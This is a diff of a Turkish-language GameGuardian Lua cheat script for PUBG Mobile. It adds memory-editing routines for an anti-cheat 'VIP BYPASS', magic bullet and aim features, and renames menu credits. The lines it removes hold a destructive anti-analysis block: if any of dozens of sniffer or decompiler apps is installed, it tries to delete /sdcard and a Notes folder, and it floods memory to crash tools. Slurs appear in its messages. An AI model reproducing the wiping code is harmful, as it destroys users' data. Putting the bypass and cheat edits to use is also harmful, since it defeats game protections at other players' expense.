@@ -1,488 +1,8 @@
-ANT2 = {}
-for i = 1, 40000 do
-table.insert(ANT2, {address = 127 + i, flags = 12, values = 127})
-end
-clock = os.clock()
-time = os.time()
-for i = 1, 6 do gg.addListItems(ANT2) end
-if os.clock() - clock > 2 then
-gg.removeListItems(ANT2)
-gg.alert("Antilog By Jester")
-os.exit()
-end
-if os.time() - time > 2 then
-gg.removeListItems(ANT2)
-gg.alert("Antilog By Jester")
-os.exit()
-end 
-gg.removeListItems(ANT2)
-
-
-collectgarbage("collect")
-;({
-  ["MOTHERFUCKER"] = function()
-    if gg.isPackageInstalled("com.guoshi.httpcanary") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.packagesniffer.frtparlak") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("frtparlak.rootsniffer") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.hckeam.mjgql") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.hckeam.mjgql") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.minhui.wifianalyzer") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-     if gg.isPackageInstalled("com.thedecrypter") then
-     print("Orospu Cocugu Dec Gg Sil")
-     os.remove("/sdcard")
-     os.exit()
-   end
-    if gg.isPackageInstalled("com.prabalgaming.logger") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.redwolfgaming.ripgg") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.nochqxpucsbldqqx") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.ghueczxrttlhgd") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.yy.qptvrjwerw.ghoex") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.tssfjipkmrco") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.vip.paidhacksonly.mr.toxin") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.ioyysvgfsrig") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.kaoygxapp") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.beyzahack.gg") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.mrteamz.id") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.jtbodgpqxox") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.mod.iraq") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.xyyxgxfn") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.vnpqk") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.mwjvnwesbghkxbjznbwo") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.roxmemek") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.fhshwhpvqvruvjtu") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.fireongaming.fog") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.raincitygaming.ggmod") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.nydpvsb.z.r.pkgh") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.dectool.vip") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.gmsm") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.sudsjcqvvcmgutdjeg") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.coolfoolggfuckscript.tm") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.eidymumcghpfeeeavps") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.foxcyber.gg") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.sxqa") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.zgb") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.rjvsbmhdspmnfbame") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.vrexqfftfsxekm.kl") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.ghueczxrttlhgd") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.pvt4u") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.Egypt.yuosseef") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.ioyysvgfsriht") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.dzelttwyuyyes") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.blackduty.gc") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.s.fyojrme") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.kaoygxapp") then
-     print("Orospu Cocugu Dec Gg Sil")
-     os.remove("/sdcard")
-     os.exit()
-    end
-    if gg.isPackageInstalled("com.roxzyt") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.fuck.tencent") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.rakesh.yt") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.smile.ggmods") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.gg.HODLogger") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.goushi.gtpcanary") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.tencent.eim") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.z.llxqxxkgkjxs") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.remoyt.gg") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.anonymous.pro") then
-      print("Orospu Çocuğu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.devta_official.in") then
-      print("Orospu Çocuğu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.jxuvskrwqlwyccpzzjoc") then
-      print("Orospu Çocuğu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("allawi.ss.tool") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("sstool.only.com.sstool") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.sstool.lite") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.polish.sstool.free") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.runnion.dectool") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("ssnesiatool.wtkc.kbgsh") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("sstool.mod.mafia") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.zyt.sstool.premium") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("SSTool.Mod.ALI.ALQAISI") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.sstool.tlcRINT") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.hook") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("ssnesiatool.wtkc.kbgsh") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-     if gg.isPackageInstalled("com.prologalanggultrapro.gg") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.aero.ss") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.lua.decompile") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    if gg.isPackageInstalled("com.vip.sstool") then
-      print("Orospu Cocugu Dec Gg Sil")
-      os.remove("/sdcard")
-      os.exit()
-    end
-    gg.searchNumber(string.char(4, 255, 255, 1, 0):rep(200):rep(200), 5)
-    debug.traceback(5, nil, string.char(4, 255, 255, 1, 0):rep(200):rep(200):rep(100))
-    a = {}
-    for i = 1, 10 do
-      table.insert(a, {
-        address = 0 + i,
-        flags = 4,
-        values = 0
-      })
-    end
-    t1 = os.time()
-    for i = 1, 1 do
-      gg.removeResults(a)
-    end
-    gg.clearList()
-    t2, a = os.time(), "restart"
-    if t2 < t1 then
-      gg.alert("")
-      return
-    end
-    if t2 > t1 then
-      a = "Check Log"
-    end
-    if os.difftime(t2, t1) > 99 then
-      return gg.alert(a, "")
-    end
-    if tostring(os):find("@") then
-      return gg.alert("log")
-    end
-    s = string.char(255, 255):rep(999999)
-    for i = 1, 444 do
-      debug.getinfo(1000, nil, s)
-    end
-    gg.refineNumber("0", string.char(255, 255, 255, 255, 255, 255):rep(998):rep(998):rep(4), string.char(255, 255, 255, 255, 255, 255):rep(998):rep(998):rep(4), string.char(255, 255, 255, 255, 255, 255):rep(998):rep(998):rep(4), string.char(255, 255, 255, 255, 255, 255):rep(998):rep(998):rep(4), string.char(255, 255, 255, 255, 255, 255):rep(998):rep(998):rep(4), string.char(255, 255, 255, 255, 255, 255):rep(998):rep(998):rep(4), (string.char(255, 255, 255, 255, 255, 255):rep(998):rep(998):rep(4)))
-  end
-  
-}).MOTHERFUCKER()
-
-LogDetect = os.time()
-Spam = string.char(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 4, 4, 8)
-Spam = Spam:rep(999)
-for i = 1, 5000 do
-  debug.getinfo(i, nil, Spam)
-  LogDetect2 = os.time()
-  a = LogDetect2 - LogDetect
-  if a <= 1.7555555555555555 then
-  else
-    gg.alert("By Jester")
-    gg.setVisible(true)
-    os.remove("/storage/emulated/0/Notes")
-    os.exit()
-    return
-  end
-end
-gg.sleep(300)
-gg.toast("Yanlızca 1 Sn")
-gg.sleep(500)
-
-local save = {}
-for i = 1, 5000 do table.insert(save, {address = 136 + i,  flags = 4,  values = 136}) end
-local time = os.time()
-local clock = os.clock()
-for i = 1, 6 do
-gg.addListItems(save)
-end
-gg.removeListItems(save)
-local time2, clock2, a = os.time(), os.clock(), "Log Block By Jester"
-if time2 < time then
-gg.alert("Orospu Cocugu Dec Gg Sil")
-return
-end
-if time2 > time then
-a = "Orospu Cocugu Dec Gg Sil"
-end
-if os.difftime(time2, time) > 2 then
-return gg.alert(a, "")
-end
-if clock2 < clock then
-gg.alert("Orospu Cocugu Dec Gg Sil")
-return
-end
-if clock2 > clock then
-a = "Orospu Cocugu Dec Gg Sil"
-end
-
-if(nil)then;local strss = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #strss[-nil%nil%-nil] ~= nil then;strss[-nil%nil%-nil] = strss[-nil%nil%nil]()mrsn[-nil%-nil]();end;::SKYN::;strss[-nil%nil%-nil] = strss[-nil%nil%nil]();goto SKYN;strss = nil;end;for i = 1, 0 do;local strss = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #strss[-nil%nil%-nil] ~= nil then;strss[-nil%nil%-nil] = strss[-nil%nil%nil]()mrsn[-nil%-nil]();end;::SKYN::;strss[-nil%nil%-nil] = strss[-nil%nil%nil]();goto SKYN;strss = nil;end;if(nil)then;local strss = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #strss[-nil%nil%-nil] ~= nil then;strss[-nil%nil%-nil] = strss[-nil%nil%nil]()mrsn[-nil%-nil]();end;::SKYN::;strss[-nil%nil%-nil] = strss[-nil%nil%nil]();goto SKYN;strss = nil;end;for i = 1, 0 do;local strss = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #strss[-nil%nil%-nil] ~= nil then;strss[-nil%nil%-nil] = strss[-nil%nil%nil]()mrsn[-nil%-nil]();end;::SKYN::;strss[-nil%nil%-nil] = strss[-nil%nil%nil]();goto SKYN;strss = nil;end;if(nil)then;local strss = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #strss[-nil%nil%-nil] ~= nil then;strss[-nil%nil%-nil] = strss[-nil%nil%nil]()mrsn[-nil%-nil]();end;::SKYN::;strss[-nil%nil%-nil] = strss[-nil%nil%nil]();goto SKYN;strss = nil;end;for i = 1, 0 do;local strss = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #strss[-nil%nil%-nil] ~= nil then;strss[-nil%nil%-nil] = strss[-nil%nil%nil]()mrsn[-nil%-nil]();end;::SKYN::;strss[-nil%nil%-nil] = strss[-nil%nil%nil]();goto SKYN;strss = nil;end;if(nil)then;local strss = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #strss[-nil%nil%-nil] ~= nil then;strss[-nil%nil%-nil] = strss[-nil%nil%nil]()mrsn[-nil%-nil]();end;::SKYN::;strss[-nil%nil%-nil] = strss[-nil%nil%nil]();goto SKYN;strss = nil;end;for i = 1, 0 do;local strss = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #strss[-nil%nil%-nil] ~= nil then;strss[-nil%nil%-nil] = strss[-nil%nil%nil]()mrsn[-nil%-nil]();end;::SKYN::;strss[-nil%nil%-nil] = strss[-nil%nil%nil]();goto SKYN;strss = nil;end;if(nil)then;local strss = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #strss[-nil%nil%-nil] ~= nil then;strss[-nil%nil%-nil] = strss[-nil%nil%nil]()mrsn[-nil%-nil]();end;::SKYN::;strss[-nil%nil%-nil] = strss[-nil%nil%nil]();goto SKYN;strss = nil;end;for i = 1, 0 do;local strss = {{-nil,{nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #strss[-nil%nil%-nil] ~= nil then;strss[-nil%nil%-nil] = strss[-nil%nil%nil]()mrsn[-nil%-nil]();end;::SKYN::;strss[-nil%nil%-nil] = strss[-nil%nil%nil]();goto SKYN;strss = nil;end;if(nil)then;local strss = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #strss[-nil%nil%-nil] ~= nil then;strss[-nil%nil%-nil] = strss[-nil%nil%nil]()mrsn[-nil%-nil]();end;::SKYN::;strss[-nil%nil%-nil] = strss[-nil%nil%nil]();goto SKYN;strss = nil;end;for i = 1, 0 do;local strss = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #strss[-nil%nil%-nil] ~= nil then;strss[-nil%nil%-nil] = strss[-nil%nil%nil]()mrsn[-nil%-nil]();end;::SKYN::;strss[-nil%nil%-nil] = strss[-nil%nil%nil]();goto SKYN;strss = nil;end
-local function WRONG() gg.alert("block by jester") 
-end
-
-
 
 on = '✔️'
 off = '❌'
+
+
 
 
 ------Bit Tespit
@@ -519,7 +39,7 @@ function HOME(...)
 "╭═══════════════╮\n           🌈Rᴇɴᴋ Hɪʟᴇsɪ\n╰═══════════════╯",  
 "╭═══════════════╮\n           🎪Eɢ̆ʟᴇɴᴄᴇ Hɪʟᴇsɪ\n╰═══════════════╯",
 "╭═══════════════╮\n           🚪Cɪᴋɪs  | |\n╰═══════════════╯",
-}, nil,"PUBG VERSİON 1.8.0\n@BY_JESTER\n@ToskaPX")
+}, nil,"PUBG VERSİON 1.8.0\n@SASSY-JESTER VİP LUA~~~~")
   if MN == nil then
   else
     if MN == 1 then
@@ -571,7 +91,7 @@ sikin1arab = gg.choice({
 "᚛⚛️᚜ sᴇᴢᴏɴ 16 ʀᴘ 100 sᴇᴛ\n╚❑[ˡᵒᵇⁱ+ᵒʸᵘⁿ]",
 "᚛♨️᚜ 𝙺𝚊𝚗lı 𝙺𝚞𝚣𝚐𝚞𝚗 sᴇᴛ\n╚❑[ˡᵒᵇⁱ+ᵒʸᵘⁿ]",
 "᚛🔙᚜ Geri"
-}, nil, "Mi6 RioT Hack Skin Menu")
+}, nil, "SASSY-JESTER ~~~~ MENÜ")
 if sikin1arab == nil then
 else
 if sikin1arab == 1 then
@@ -2031,6 +1551,54 @@ gg.setRanges(gg.REGION_C_ALLOC | gg.REGION_OTHER)
 gg.searchNumber("134658;134658", gg.TYPE_DWORD, nil, nil, nil, nil)
 gg.refineNumber("134658", gg.TYPE_DWORD)
 gg.getResults(50000)
+gg.setRanges(gg.REGION_C_ALLOC | gg.REGION_OTHER)
+gg.searchNumber("4546834185578348552;4539628424456568840", gg.TYPE_QWORD)
+gg.refineNumber("4546834185578348552", gg.TYPE_QWORD)
+gg.getResults(50000)
+gg.editAll("81604378624", gg.TYPE_QWORD)
+gg.clearResults()
+gg.setRanges(gg.REGION_C_ALLOC | gg.REGION_OTHER)
+gg.searchNumber("43984843964424;70373123031048", gg.TYPE_QWORD)
+gg.refineNumber("43984843964424", gg.TYPE_QWORD)
+gg.getResults(50000)
+gg.editAll("81604378624", gg.TYPE_QWORD)
+gg.clearResults()
+gg.setRanges(gg.REGION_C_ALLOC | gg.REGION_OTHER)
+gg.searchNumber("10999495131144;3302913736712", gg.TYPE_QWORD)
+gg.refineNumber("10999495131144", gg.TYPE_QWORD)
+gg.getResults(50000)
+gg.editAll("81604378624", gg.TYPE_QWORD)
+gg.clearResults()
+gg.setRanges(gg.REGION_C_ALLOC | gg.REGION_OTHER)
+gg.searchNumber("27492169547784;4378853384", gg.TYPE_QWORD)
+gg.refineNumber("27492169547784", gg.TYPE_QWORD)
+gg.getResults(50000)
+gg.editAll("81604378624", gg.TYPE_QWORD)
+gg.clearResults()
+gg.setRanges(gg.REGION_C_ALLOC)
+gg.searchNumber("288236973288587776;2017642319943041536", gg.TYPE_DWORD, nil, nil, nil, nil)
+gg.refineNumber("288236973288587776", gg.TYPE_DWORD)
+gg.getResults(50000)
+gg.editAll("144115188075856128", gg.TYPE_DWORD)
+gg.clearResults()
+gg.setRanges(gg.REGION_C_ALLOC)
+gg.searchNumber("216173881692585983;67110400", gg.TYPE_DWORD, nil, nil, nil, nil)
+gg.refineNumber("216173881692585983", gg.TYPE_DWORD)
+gg.getResults(50000)
+gg.editAll("144115188075856128", gg.TYPE_DWORD)
+gg.clearResults()
+gg.setRanges(gg.REGION_C_ALLOC)
+gg.searchNumber("577252194516992;288233678981562368", gg.TYPE_QWORD, nil, nil, nil, nil)
+gg.refineNumber("577252194516992", gg.TYPE_QWORD)
+gg.getResults(50000)
+gg.editAll("288233678981562368", gg.TYPE_QWORD)
+gg.setRanges(gg.REGION_C_ALLOC)
+gg.searchNumber("288234774265332736;844437882143744", gg.TYPE_QWORD, nil, nil, nil, nil)
+gg.refineNumber("288234774265332736", gg.TYPE_QWORD)
+gg.getResults(50000)
+gg.editAll("67175425", gg.TYPE_QWORD)
+gg.clearResults()
+gg.alert("VİP BYPASS AKTİF ~~~~💋")
 end
 
 function lobibypass2()
@@ -2575,7 +2143,7 @@ gg.toast(" \nBᴇᴋʟᴇ...90%\n🧹🧹🧹🧹🧹🧹🧹🧹🧹▒")
 gg.sleep(100)
 gg.toast(" \nBᴀşᴀʀıʟı…100%\n🧹🧹🧹🧹🧹🧹🧹🧹🧹🧹")
 gg.sleep(100)
-gg.toast("Mİ6 RİOT TEAM")
+gg.toast("VİP BYPASS AKTİF ~~~~💋")
 end
 
 
@@ -4438,27 +4006,34 @@ end
 function sit_yuk()
 if sit == off then
 sit = on
-gg.setRanges(gg.REGION_ANONYMOUS)
-gg.searchNumber("4138667321167981973", gg.TYPE_QWORD, false, gg.SIGN_EQUAL, 0, -1)
-gg.refineNumber("4138667321167981973", gg.TYPE_QWORD, false, gg.SIGN_EQUAL, 0, -1)
-gg.refineNumber("4138667321167981973", gg.TYPE_QWORD, false, gg.SIGN_EQUAL, 0, -1)
-gg.getResults(1401)
-gg.editAll("4848124999984742400", gg.TYPE_QWORD)
 gg.clearResults()
-gg.setRanges(gg.REGION_ANONYMOUS)
-gg.searchNumber("-4767057191653227520", gg.TYPE_QWORD, false, gg.SIGN_EQUAL, 0, -1)
-gg.refineNumber("-4767057191653227520", gg.TYPE_QWORD, false, gg.SIGN_EQUAL, 0, -1)
-gg.refineNumber("-4767057191653227520", gg.TYPE_QWORD, false, gg.SIGN_EQUAL, 0, -1)
-gg.getResults(1401)
-gg.editAll("-4767057191527907328", gg.TYPE_QWORD)
+gg.setRanges(gg.REGION_VIDEO | gg.REGION_BAD)
+gg.searchNumber("5.1097599e21;8.2676609e-44;2.0:13", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
+gg.refineNumber("2.0", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
+gg.refineAddress("200", -1, gg.TYPE_FLOAT, gg.SIGN_EQUAL, 0, -1)
+gg.getResults(63825)
+gg.editAll("120", gg.TYPE_FLOAT)
 gg.clearResults()
-gg.setRanges(gg.REGION_ANONYMOUS)
+gg.setRanges(gg.REGION_VIDEO | gg.REGION_BAD)
+gg.searchNumber("2.0;0.69314718246;0.00999999978:29", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
+gg.refineNumber("2.0", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
+gg.refineAddress("9B0", -1, gg.TYPE_FLOAT, gg.SIGN_EQUAL, 0, -1)
+gg.getResults(63825)
+gg.editAll("120", gg.TYPE_FLOAT)
 gg.clearResults()
-gg.searchNumber("18.38787841797;0.53867292404;-3.42232513428;1.77635705e-15:13", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
-gg.refineNumber("18.38787841797", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
-aaa = gg.getResults(2805)
-gg.editAll("130.5419921875", gg.TYPE_FLOAT)
 gg.clearResults()
+gg.setRanges(gg.REGION_VIDEO | gg.REGION_BAD)
+gg.searchNumber("537133066;8200;1194344459;8201:13", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
+gg.refineNumber("8201", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
+gg.getResults(63825)
+gg.editAll("7", gg.TYPE_DWORD)
+gg.clearResults()
+gg.setRanges(gg.REGION_C_DATA | gg.REGION_CODE_APP)
+gg.searchNumber("2015175168", gg.TYPE_FLOAT)
+gg.getResults(667478)
+gg.editAll("-999", gg.TYPE_FLOAT)
+gg.clearResults()
+
 sit = on
 else
 gg.clearResults()
@@ -5075,7 +4650,7 @@ function eln(...)
 " ⟅🐯⟆Otomatik Awmʸᵉⁿⁱ\n╚❑[Oʏᴜɴ]",
 "⟅💣⟆Bullet Track ʸᵉⁿⁱ\n╚❑[Oʏᴜɴ]", 
           "⏪ɢᴇʀɪ",
-    }, nil,"Mİ6 RİOT TEAM EĞLENCE MENÜ")
+    }, nil,"VİP EĞLENCE MENÜ")
     if cp == nil then
     else
       if cp[1] == true then 
@@ -6122,7 +5697,6 @@ gg.searchNumber("15;28;16;26;8;18", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
 gg.getResults(56)
 gg.editAll("-1339", gg.TYPE_FLOAT)
 gg.toast("MAGIC BULLET 75 % 0N🔥")
-gg.alert(" TELEGRAM @RioTChannel")
 end
 
 function MZ3()
@@ -6134,7 +5708,6 @@ gg.refineNumber("-1.1144502e28", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
 gg.getResults(2)
 gg.editAll("7.5", gg.TYPE_FLOAT)
 gg.toast("MAGIC BULLET 100 % 0N🔥")
-gg.alert(" TELEGRAM @RioTChannel")
 end
 
 
@@ -6175,483 +5748,4 @@ while true do
     HOME()
   end
 end
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
